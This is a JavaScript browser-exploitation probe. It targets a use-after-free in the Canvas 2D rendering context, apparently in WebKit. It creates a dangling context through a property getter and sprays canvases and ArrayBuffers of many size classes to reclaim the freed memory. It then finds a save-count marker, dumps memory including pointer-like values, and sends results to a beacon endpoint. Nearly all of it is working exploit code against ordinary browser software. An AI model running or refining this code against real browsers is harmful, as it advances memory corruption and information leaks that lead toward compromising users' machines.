// p490 — Canvas UAF: Multi-size AB spray to find exact size class
//
// V487 proved: save() through dangling ptr works (no crash), but 768B ABs
// don't reclaim the slot. sizeof(CanvasRenderingContext2D) must be different.
//
// This probe tries ABs of many sizes to find which one lands.
// After each size batch, call save() and scan for the marker.
//
// Also tries ImageData (192×1 = 768B) and other canvas backing sizes.
//
// Beacon prefix: V490-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function Q(tag, body) { bQ.push([tag, body || '']); }
  function flushBeacons() {
    for (var i = 0; i < bQ.length; i++) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V490-' + bQ[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
      } catch(e) {}
    }
    bQ = [];
  }

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V490-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Canvas UAF + Same-Type Spray (proven baseline)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  // Same-type spray
  var sprayC = [], sprayX = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX.push(ctx);
  }

  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
    B('UAF1-MISS', 'lw=' + lw1);
    flushBeacons();
    return;
  }
  var idx1 = Math.round(lw1 - 500);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Measure actual context size via same-type spray
  //
  // Create contexts of known sizes and see which one aliases.
  // Actually: use save() to find the marker offset first.
  //
  // The aliased pair is still alive. Let's use it to calibrate:
  // Write a known pattern via sprayX[idx1], read via dCtx1.
  // Then do save() via sprayX[idx1] (safe, no UAF) and find
  // where m_unrealizedSaveCount lives.
  // ═══════════════════════════════════════════════════════════

  // First: read current state via both sides
  var curLw = sprayX[idx1].lineWidth;
  Q('CALIBRATE', 'lw=' + curLw);

  // Create DataView over a fresh AB to measure save offset
  // Strategy: use the aliased ctx pair. sprayX[idx1] IS the same
  // context as dCtx1 (same memory). We can't directly read the
  // raw bytes. But we can use save/restore to probe.

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Free aliased context + multi-size AB spray
  //
  // Try sizes: 512, 640, 704, 736, 752, 768, 784, 800, 816,
  //            832, 848, 864, 896, 960, 1024, 1088, 1152, 1280
  //
  // For each size: spray 50 ABs, call save(), scan for marker.
  // ═══════════════════════════════════════════════════════════

  // Free the aliased context
  var aliasedCanvas = sprayC[idx1];
  if (aliasedCanvas && aliasedCanvas.parentNode) {
    aliasedCanvas.parentNode.removeChild(aliasedCanvas);
  }
  sprayC[idx1] = null;
  sprayX[idx1] = null;
  aliasedCanvas = null;

  // Aggressive GC: multiple rounds with varied sizes
  for (var round = 0; round < 5; round++) {
    var junk = [];
    for (var g = 0; g < 4000; g++) {
      junk.push({a: new ArrayBuffer(32 + round * 16), b: [g]});
    }
    junk = null;
  }
  // Also try triggering eden GC
  for (var round = 0; round < 3; round++) {
    var junk2 = [];
    for (var g = 0; g < 2000; g++) {
      junk2.push(new Float64Array(8));
    }
    junk2 = null;
  }

  Q('GC-DONE', 'freed-idx=' + idx1);

  // Check if save() still works after GC
  var preSaveOk = false;
  try { dCtx1.save(); preSaveOk = true; } catch(e) {}
  Q('PRE-SAVE', 'ok=' + preSaveOk);
  if (!preSaveOk) { flushBeacons(); return; }

  // Restore to reset the count
  try { dCtx1.restore(); } catch(e) {}

  // Size classes to try — cover a wide range
  var SIZES = [
    512, 576, 640, 672, 704, 720, 736, 744, 752, 756, 760, 764,
    768, 772, 776, 780, 784, 788, 792, 796, 800, 808, 816, 824,
    832, 848, 864, 880, 896, 912, 928, 944, 960, 992, 1024,
    1056, 1088, 1152, 1280, 1408, 1536
  ];

  var PER_SIZE = 40;
  var allSpray = {}; // size -> [{ab, view}]

  // Spray ALL sizes
  for (var si = 0; si < SIZES.length; si++) {
    var sz = SIZES[si];
    var batch = [];
    for (var i = 0; i < PER_SIZE; i++) {
      var ab = new ArrayBuffer(sz);
      batch.push({ab: ab, view: new DataView(ab)});
    }
    allSpray[sz] = batch;
  }

  Q('SPRAY-DONE', 'sizes=' + SIZES.length + ',perSize=' + PER_SIZE + ',total=' + (SIZES.length * PER_SIZE));

  // Now call save() through dangling pointer
  var saveOk2 = false;
  try { dCtx1.save(); saveOk2 = true; } catch(e) { Q('SAVE2-ERR', e.message); }
  Q('SAVE2', 'ok=' + saveOk2);

  if (!saveOk2) { flushBeacons(); return; }

  // Scan ALL ABs at ALL candidate offsets for value=1
  // Candidate offsets: 400-700 in steps of 4
  var found = [];
  for (var si = 0; si < SIZES.length; si++) {
    var sz = SIZES[si];
    var batch = allSpray[sz];
    for (var ai = 0; ai < batch.length; ai++) {
      var view = batch[ai].view;
      for (var off = 400; off < sz && off < 700; off += 4) {
        var val = view.getUint32(off, true);
        if (val === 1) {
          found.push({sz: sz, ai: ai, off: off});
        }
      }
    }
  }

  if (found.length > 0) {
    Q('FOUND', 'count=' + found.length);
    for (var fi = 0; fi < Math.min(found.length, 10); fi++) {
      var f = found[fi];
      Q('HIT-' + fi, 'sz=' + f.sz + ',ab=' + f.ai + ',off=' + f.off);

      // Double-confirm: call save again, check value=2
      try {
        dCtx1.save();
        var val2 = allSpray[f.sz][f.ai].view.getUint32(f.off, true);
        Q('CONFIRM-' + fi, 'val=' + val2 + ',expect=2,match=' + (val2 === 2));
        dCtx1.restore(); // undo the extra save
      } catch(e) {
        Q('CONFIRM-ERR-' + fi, e.message);
      }
    }

    // Dump first 64 bytes and area around marker for the first hit
    var f0 = found[0];
    var tv = allSpray[f0.sz][f0.ai].view;
    var hexHead = [];
    for (var h = 0; h < 64; h += 8) {
      var lo = tv.getUint32(h, true);
      var hi = tv.getUint32(h + 4, true);
      hexHead.push(h + ':' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8));
    }
    Q('DUMP-HEAD', hexHead.join(','));

    var hexMark = [];
    var ms = Math.max(0, f0.off - 16);
    var me = Math.min(f0.sz, f0.off + 32);
    for (var h = ms; h < me; h += 4) {
      hexMark.push(h + ':' + ('00000000' + tv.getUint32(h, true).toString(16)).slice(-8));
    }
    Q('DUMP-MARKER', hexMark.join(','));

    // Also scan offset 0-120 for pointer-like values (non-zero 8-byte values)
    var ptrScan = [];
    for (var h = 0; h < 120; h += 8) {
      var lo = tv.getUint32(h, true);
      var hi = tv.getUint32(h + 4, true);
      if (lo !== 0 || hi !== 0) {
        ptrScan.push(h + ':0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8));
      }
    }
    Q('PTR-SCAN', ptrScan.join(','));

  } else {
    Q('MISS', 'no hit across ' + SIZES.length + ' sizes');

    // Wider scan: check if ANY byte in ANY AB is non-zero (beyond what we wrote)
    var anyNz = [];
    for (var si = 0; si < SIZES.length && anyNz.length < 5; si++) {
      var sz = SIZES[si];
      var batch = allSpray[sz];
      for (var ai = 0; ai < Math.min(batch.length, 5) && anyNz.length < 5; ai++) {
        var view = batch[ai].view;
        var nzCount = 0;
        for (var off = 0; off < sz; off += 4) {
          if (view.getUint32(off, true) !== 0) nzCount++;
        }
        if (nzCount > 0) {
          anyNz.push('sz=' + sz + ',ab=' + ai + ',nz=' + nzCount);
        }
      }
    }
    Q('NZ-CHECK', anyNz.length > 0 ? anyNz.join(';') : 'all-zero');

    // Maybe the context wasn't freed. Test: does lineWidth through dCtx1
    // still return a spray-like value?
    var postLw = -999;
    try {
      // DANGER: if m_stateStack was zeroed by AB, this crashes.
      // But if context is still alive, this reads the valid state.
      postLw = dCtx1.lineWidth;
    } catch(e) {
      Q('POST-LW-ERR', 'crash: ' + e.message);
    }
    if (postLw !== -999) {
      Q('POST-LW', 'val=' + postLw);
      if (postLw === 777.25) {
        Q('STILL-ALIVE', 'context NOT freed - our written value persists');
      } else if (postLw >= 500 && postLw < 700) {
        Q('STILL-SPRAY', 'context NOT freed - still has spray value');
      } else {
        Q('POST-LW-OTHER', 'val=' + postLw);
      }
    }
  }

  Q('DONE', 'found=' + found.length);
  flushBeacons();
})();
